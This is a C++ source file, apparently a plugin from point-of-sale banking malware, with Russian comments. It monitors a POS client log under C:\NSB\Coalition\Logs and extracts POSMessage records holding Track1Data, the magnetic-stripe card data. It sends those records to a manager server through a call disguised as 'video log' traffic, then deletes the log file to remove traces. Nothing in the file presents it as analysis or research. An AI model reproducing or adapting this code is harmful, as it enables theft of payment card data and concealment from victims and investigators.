#include "plugins.h"
#include "other.h"
#include "main.h"
#include "manager.h"
#include "core\pipe.h"
#include "core\FileTools.h"

namespace Plugins
{

static void HandlerCreateIdLog( Pipe::AutoMsg msg, DWORD tag);

static bool MonitoringCB( File::MonitoringStru* m )
{
	if( m )
	{
		if( m->action == FILE_ACTION_MODIFIED )
		{
			if( m->tag == 0 )
			{
				m->tag = 0xffffffff; //метка что отослали запрос кода потока
				ManagerServer::CreateVideoLog( _CS_("nsb.pos.client"), HandlerCreateIdLog, 0, (DWORD)m );
				Delay(2000); //ждем пока код прийдет
			}
			else
				Delay(1000); //небольшое ожидание пока файл полностью запишется
			Mem::Data data;
			File::ReadAll( m->fullName->c_str(), data );
			StringBuilder s(data);
			int p1 = 0;
			bool del = true;
			for(;;)
			{
				p1 = s.IndexOf( p1, _CS_("<POSMessage") );
				if( p1 >= 0 )
				{
					int p2 = s.IndexOf( p1, _CS_("POSMessage>") );
					if( p2 > 0 )
					{
						int p3 = s.IndexOf( p1, _CS_("<Track1Data>") );
						if( p3 > 0 && p3 < p2 )
						{
							int p4 = s.IndexOf( p3, _CS_("</Track1Data>") );
							if( p4 > 0 && p4 < p2 && p4 - p3 > 50 )
							{
								if( m->tag != 0 && m->tag != 0xffffffff ) 
								{
									//ищем начало предыдущей строки, чтобы и ее тоже отсылать
									int p = p1;
									int xA = 2; //на каком символе \n (0xa) нужно остановить поиск
									while( p > 0 )
									{
										if( s[p - 1] == '\n' )
											if( --xA == 0 )
												break;
										p--;
									}
									ManagerServer::SendVideoLog( m->tag, &s[p], p2 - p + 11 );
								}
								else //еще не известен код потока для лога
									del = false; //поэтому удалять файл рано
							}
						}
						p1 = p2 + 11;
					}
					else
					{
						del = false;
						break; //нужно еще ждать
					}
				}
				else
					break;
			}
			if( del ) 
			{
				File::Delete( m->fullName->c_str() ); //удаление файла
			}
		}
	}
	return true;
}

void HandlerCreateIdLog( Pipe::AutoMsg msg, DWORD tag)
{
	File::MonitoringStru* files = (File::MonitoringStru*)tag;
	files->tag = *((uint*)msg->data);
}

DWORD WINAPI MonitoringFile( void* )
{
	File::MonitoringStru files;
	Mem::Zero(files);
	StringBuilderStack<32> fileName( _CS_("nsb.pos.client.log") );
	files.fileName = fileName;
	File::Monitoring( _CS_("C:\\NSB\\Coalition\\Logs"), &files, 1, MonitoringCB );
	return 0;
}

}
